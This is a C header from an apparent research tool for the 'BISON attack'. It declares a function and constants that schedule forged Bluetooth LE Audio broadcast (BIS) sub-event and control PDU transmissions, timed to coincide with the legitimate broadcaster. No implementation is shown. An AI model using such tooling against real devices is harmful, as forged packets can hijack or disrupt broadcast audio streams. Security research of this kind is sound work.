/*
 * SPDX-License-Identifier: Apache-2.0
 *
 * BIS sub-event transmission for the BISON attack.
 *
 * Given the current bison_sniff snapshot, schedule a radio TX to
 * land on the (channel, time) the legitimate broadcaster will use
 * for a specific (event_counter, bis_index, intra_bis_se_idx).
 *
 */

#ifndef BISON_TX_H_
#define BISON_TX_H_

#include <stdint.h>

#define BISON_TX_LLID_COMPLETE_END   0x00  /* unframed complete or end frag */
#define BISON_TX_LLID_START_CONTINUE 0x01  /* unframed start or continuation */
#define BISON_TX_LLID_FRAMED         0x02  /* framed SDU segments */
#define BISON_TX_LLID_CTRL           0x03  /* BIG Control PDU */

/**
 * @brief Schedule a single-shot forged BIS sub-event TX.
 *
 * @param event_counter    Absolute target BIG event counter
 *                         (16-bit wraps per spec).
 * @param bis_index        1-indexed BIS within the BIG, 1..num_bis.
 * @param intra_bis_se_idx 0-indexed sub-event within the BIS event.
 * @param llid             PDU LLID, BISON_TX_LLID_*.
 * @param cssn             Control-Subevent Sequence Number (3 bits).
 *                         For a data PDU that matches the current
 *                         steady state, use snap.cssn_curr. For a
 *                         data PDU that signals an upcoming CTRL PDU,
 *                         use (cssn_curr + 1) & 7 and set @p cstf=1.
 * @param cstf             Control-Subevent Transmission Flag (1 bit).
 *                         Set to 1 on the data PDUs that precede a
 *                         forged CTRL PDU in the same BIG event.
 * @param pdu_data         PDU payload bytes; may be NULL iff pdu_len==0.
 * @param pdu_len          Payload length, must fit max_pdu.
 *
 * @return 0 on success, negative errno on bad input / no snapshot /
 *         scheduler refused.
 */
int bison_tx_schedule(uint16_t event_counter,
		      uint8_t bis_index,
		      uint8_t intra_bis_se_idx,
		      uint8_t llid,
		      uint8_t cssn,
		      uint8_t cstf,
		      const uint8_t *pdu_data,
		      uint8_t pdu_len);

#endif /* BISON_TX_H_ */
